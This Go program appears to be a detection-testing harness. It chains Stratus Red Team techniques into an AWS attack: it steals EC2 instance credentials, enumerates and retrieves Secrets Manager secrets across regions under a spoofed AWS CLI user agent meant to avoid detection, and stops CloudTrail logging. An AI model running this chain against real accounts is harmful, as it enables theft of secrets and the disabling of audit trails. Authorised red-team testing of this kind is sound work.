package main

import (
	"context"
	"fmt"
	"log"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	"github.com/aws/aws-sdk-go-v2/service/secretsmanager"
	"github.com/aws/smithy-go/middleware"
	smithyhttp "github.com/aws/smithy-go/transport/http"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/useragent"
)

/*
Multi-stage EC2 credential harvesting to secrets exfiltration scenario for Panther detection testing:
1. Steal EC2 instance credentials from metadata service (credential access)
2. Use stolen credentials to enumerate secrets across multiple regions (discovery)
3. Bulk retrieve secrets from Secrets Manager (credential access)
4. Attempt to disable CloudTrail logging to cover tracks (defense evasion)

This simulates a realistic attack chain where an attacker:
- Compromises EC2 instance credentials (SSRF, insider threat, or container escape)
- Performs multi-region secrets discovery and harvesting
- Attempts defense evasion to avoid detection
*/

type HarvestedCredentials struct {
	AccessKeyID     string
	SecretAccessKey string
	SessionToken    string
	InstanceID      string
}

// createAWSConfigWithHarvestedCredentials creates an AWS config with harvested credentials and Stratus user agent
func createAWSConfigWithHarvestedCredentials(accessKeyID, secretAccessKey, sessionToken, region string) (aws.Config, error) {
	// Create custom user agent middleware similar to Stratus
	customUserAgentMiddleware := func() middleware.BuildMiddleware {
		return middleware.BuildMiddlewareFunc("StratusUserAgent", func(
			ctx context.Context, input middleware.BuildInput, next middleware.BuildHandler,
		) (out middleware.BuildOutput, metadata middleware.Metadata, err error) {
			request, ok := input.Request.(*smithyhttp.Request)
			if !ok {
				return out, metadata, fmt.Errorf("unknown transport type %T", input.Request)
			}
			// Use a realistic AWS CLI user agent to avoid detection
			userAgent := "aws-cli/2.13.25 Python/3.11.5 Linux/5.15.0-84-generic source/x86_64.ubuntu.22.04 prompt/off command/secretsmanager.get-secret-value"
			request.Header.Set("User-Agent", userAgent)
			return next.HandleBuild(ctx, input)
		})
	}

	options := []func(*config.LoadOptions) error{
		config.WithCredentialsProvider(
			credentials.NewStaticCredentialsProvider(accessKeyID, secretAccessKey, sessionToken),
		),
		config.WithAPIOptions([]func(stack *middleware.Stack) error{
			func(stack *middleware.Stack) error {
				return stack.Build.Add(customUserAgentMiddleware(), middleware.After)
			},
		}),
	}

	if region != "" {
		options = append(options, config.WithRegion(region))
	}

	cfg, err := config.LoadDefaultConfig(context.Background(), options...)
	if err != nil {
		return aws.Config{}, fmt.Errorf("unable to load SDK config: %w", err)
	}

	return cfg, nil
}

const SCENARIO_PREFIX = "security-audit"

func main() {
	// Set realistic user agent prefix for all stratus techniques to avoid detection
	useragent.SetUserAgentPrefix("aws-cli")

	log.Println("Starting EC2 credential harvesting to secrets exfiltration scenario...")

	// Stage 1: Steal EC2 instance credentials
	log.Println("\nStage 1: Harvesting EC2 instance credentials...")
	harvestedCreds, err := stealEC2Credentials()
	if err != nil {
		log.Fatal("Failed to steal EC2 credentials: " + err.Error())
	}
	defer cleanupEC2CredentialTheft()

	// Allow AWS propagation time
	log.Println("Waiting for AWS credential propagation...")
	time.Sleep(10 * time.Second)

	// Stage 2: Multi-region secrets discovery
	log.Println("\nStage 2: Performing multi-region secrets discovery...")
	secretTargets, err := performSecretsDiscovery(harvestedCreds)
	if err != nil {
		log.Printf("Secrets discovery failed: %s", err.Error())
	}

	// Stage 3: Bulk secrets retrieval
	log.Println("\nStage 3: Attempting bulk secrets retrieval...")
	err = performBulkSecretsHarvest(harvestedCreds, secretTargets)
	if err != nil {
		log.Printf("Bulk secrets harvest failed: %s", err.Error())
	}

	// Stage 4: Defense evasion - attempt to disable CloudTrail
	log.Println("\nStage 4: Attempting defense evasion (CloudTrail tampering)...")
	err = attemptDefenseEvasion()
	if err != nil {
		log.Printf("Defense evasion failed: %s", err.Error())
	}

	log.Println("\nMulti-stage EC2 credential harvesting scenario completed!")
	log.Println("Check your Panther logs for the following detections:")
	log.Println("   - EC2 instance metadata access anomalies")
	log.Println("   - Cross-region Secrets Manager ListSecrets operations")
	log.Println("   - Bulk GetSecretValue operations")
	log.Println("   - CloudTrail StopLogging attempts")
	log.Println("   - Time correlation between credential theft → discovery → exfiltration")

	log.Println("\nPress Enter to clean up resources...")
	fmt.Scanln()
}

func stealEC2Credentials() (*HarvestedCredentials, error) {
	// First clean up any existing technique state
	log.Println("Cleaning up any existing EC2 credential technique state...")
	cmd := exec.Command("../bin/stratus", "cleanup", "aws.credential-access.ec2-steal-instance-credentials", "--prefix", SCENARIO_PREFIX)
	cmd.Run() // Ignore errors since technique might not exist

	// Warm up EC2 credential stealing technique
	log.Println("Warming up EC2 credential stealing technique...")
	cmd = exec.Command("../bin/stratus", "warmup", "aws.credential-access.ec2-steal-instance-credentials", "--prefix", SCENARIO_PREFIX)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("warmup failed: %w, output: %s", err, string(output))
	}

	log.Printf("EC2 warmup output: %s", string(output))

	// Execute EC2 credential stealing technique and capture output
	log.Println("Detonating EC2 credential stealing...")
	cmd = exec.Command("../bin/stratus", "detonate", "aws.credential-access.ec2-steal-instance-credentials", "--prefix", SCENARIO_PREFIX)
	output, err = cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("detonation failed: %w, output: %s", err, string(output))
	}

	// Parse the output to extract credentials
	outputStr := string(output)
	log.Println("EC2 credential theft output:", outputStr)

	// Extract instance ID and credentials from output
	instanceIDRegex := regexp.MustCompile(`i-[a-f0-9]+`)
	instanceIDMatch := instanceIDRegex.FindString(outputStr)
	if instanceIDMatch == "" {
		return nil, fmt.Errorf("could not find instance ID in output")
	}

	// Extract Access Key ID (typical AWS format)
	accessKeyRegex := regexp.MustCompile(`AccessKeyId.*?([A-Z0-9]{20})`)
	accessKeyMatch := accessKeyRegex.FindStringSubmatch(outputStr)
	if len(accessKeyMatch) < 2 {
		// Try alternative pattern
		accessKeyRegex = regexp.MustCompile(`"AccessKeyId": "([A-Z0-9]{20})"`)
		accessKeyMatch = accessKeyRegex.FindStringSubmatch(outputStr)
		if len(accessKeyMatch) < 2 {
			return nil, fmt.Errorf("could not find access key in output")
		}
	}

	// Extract Secret Access Key
	secretKeyRegex := regexp.MustCompile(`SecretAccessKey.*?([A-Za-z0-9/+=]{40})`)
	secretKeyMatch := secretKeyRegex.FindStringSubmatch(outputStr)
	if len(secretKeyMatch) < 2 {
		// Try alternative pattern
		secretKeyRegex = regexp.MustCompile(`"SecretAccessKey": "([A-Za-z0-9/+=]{40})"`)
		secretKeyMatch = secretKeyRegex.FindStringSubmatch(outputStr)
		if len(secretKeyMatch) < 2 {
			return nil, fmt.Errorf("could not find secret key in output")
		}
	}

	// Extract Session Token (for EC2 instance credentials)
	sessionTokenRegex := regexp.MustCompile(`SessionToken.*?([A-Za-z0-9/+=]{100,})`)
	sessionTokenMatch := sessionTokenRegex.FindStringSubmatch(outputStr)
	sessionToken := ""
	if len(sessionTokenMatch) >= 2 {
		sessionToken = sessionTokenMatch[1]
	}

	creds := &HarvestedCredentials{
		AccessKeyID:     accessKeyMatch[1],
		SecretAccessKey: secretKeyMatch[1],
		SessionToken:    sessionToken,
		InstanceID:      instanceIDMatch,
	}

	log.Printf("Harvested credentials from instance: %s", creds.InstanceID)
	log.Printf("Captured access key: %s", creds.AccessKeyID)
	return creds, nil
}

func performSecretsDiscovery(creds *HarvestedCredentials) ([]string, error) {
	log.Printf("Using harvested credentials: %s", creds.AccessKeyID)

	// Regions to scan for secrets
	targetRegions := []string{
		"us-east-1", "us-east-2", "us-west-1", "us-west-2", "eu-west-1",
	}

	var allSecrets []string

	for _, region := range targetRegions {
		log.Printf("Scanning region %s for secrets...", region)

		// Create AWS config with harvested credentials
		cfg, err := createAWSConfigWithHarvestedCredentials(
			creds.AccessKeyID, creds.SecretAccessKey, creds.SessionToken, region)
		if err != nil {
			log.Printf("  Failed to configure region %s: %s", region, err.Error())
			continue
		}

		// Create Secrets Manager client
		client := secretsmanager.NewFromConfig(cfg)

		// List secrets in this region
		result, err := client.ListSecrets(context.Background(), &secretsmanager.ListSecretsInput{
			MaxResults: aws.Int32(50), // Limit to avoid overwhelming
		})
		if err != nil {
			log.Printf("  Failed to list secrets in %s: %s", region, err.Error())
			continue
		}

		regionSecrets := len(result.SecretList)
		log.Printf("  Found %d secrets in %s", regionSecrets, region)

		// Log high-value target patterns
		for _, secret := range result.SecretList {
			secretName := *secret.Name
			allSecrets = append(allSecrets, region+":"+secretName)

			// Identify high-value targets
			if strings.Contains(secretName, "prod") ||
				strings.Contains(secretName, "database") ||
				strings.Contains(secretName, "api-key") ||
				strings.Contains(secretName, "password") ||
				strings.Contains(secretName, "credential") {
				log.Printf("    HIGH-VALUE TARGET: %s", secretName)
			}
		}
	}

	log.Printf("Discovery complete: %d total secrets found across regions", len(allSecrets))
	return allSecrets, nil
}

func performBulkSecretsHarvest(creds *HarvestedCredentials, secretTargets []string) error {
	// First attempt to use the built-in technique for bulk retrieval
	log.Println("Setting up bulk secrets retrieval technique...")

	// Clean up any existing state
	cmd := exec.Command("../bin/stratus", "cleanup", "aws.credential-access.secretsmanager-batch-retrieve-secrets")
	cmd.Run()

	// Warm up technique
	cmd = exec.Command("../bin/stratus", "warmup", "aws.credential-access.secretsmanager-batch-retrieve-secrets")
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Bulk secrets warmup failed: %s", string(output))
		return performManualSecretsHarvest(creds, secretTargets)
	}

	// Execute technique
	log.Println("Detonating bulk secrets retrieval...")
	cmd = exec.Command("../bin/stratus", "detonate", "aws.credential-access.secretsmanager-batch-retrieve-secrets")
	output, err = cmd.CombinedOutput()
	if err != nil {
		log.Printf("Bulk secrets detonation failed: %s", string(output))
		return performManualSecretsHarvest(creds, secretTargets)
	}

	log.Printf("Bulk secrets retrieval completed: %s", string(output))
	return nil
}

func performManualSecretsHarvest(creds *HarvestedCredentials, secretTargets []string) error {
	log.Println("Attempting manual secrets harvest using harvested credentials...")

	// Limit to prevent excessive API calls
	maxSecrets := 10
	if len(secretTargets) > maxSecrets {
		secretTargets = secretTargets[:maxSecrets]
	}

	successCount := 0
	for _, target := range secretTargets {
		parts := strings.SplitN(target, ":", 2)
		if len(parts) != 2 {
			continue
		}
		region, secretName := parts[0], parts[1]

		log.Printf("  Attempting to retrieve: %s from %s", secretName, region)

		cfg, err := createAWSConfigWithHarvestedCredentials(
			creds.AccessKeyID, creds.SecretAccessKey, creds.SessionToken, region)
		if err != nil {
			continue
		}

		client := secretsmanager.NewFromConfig(cfg)
		_, err = client.GetSecretValue(context.Background(), &secretsmanager.GetSecretValueInput{
			SecretId: &secretName,
		})
		if err != nil {
			log.Printf("    Failed: %s", err.Error())
			continue
		}

		successCount++
		log.Printf("    SUCCESS: Retrieved secret value")
	}

	log.Printf("Manual secrets harvest: %d/%d secrets successfully retrieved", successCount, len(secretTargets))
	return nil
}

func attemptDefenseEvasion() error {
	log.Println("Attempting to disable CloudTrail logging...")

	// Clean up any existing state
	cmd := exec.Command("../bin/stratus", "cleanup", "aws.defense-evasion.cloudtrail-stop")
	cmd.Run()

	// Warm up technique
	cmd = exec.Command("../bin/stratus", "warmup", "aws.defense-evasion.cloudtrail-stop")
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("CloudTrail stop warmup failed: %s", string(output))
		return fmt.Errorf("defense evasion warmup failed: %w", err)
	}

	// Execute technique
	log.Println("Detonating CloudTrail stop...")
	cmd = exec.Command("../bin/stratus", "detonate", "aws.defense-evasion.cloudtrail-stop")
	output, err = cmd.CombinedOutput()
	if err != nil {
		log.Printf("CloudTrail stop failed: %s", string(output))
		return fmt.Errorf("defense evasion failed: %w", err)
	}

	log.Printf("CloudTrail tampering completed: %s", string(output))
	return nil
}

func cleanupEC2CredentialTheft() {
	log.Println("Cleaning up EC2 credential theft...")
	cmd := exec.Command("../bin/stratus", "cleanup", "aws.credential-access.ec2-steal-instance-credentials")
	cmd.Run()
}
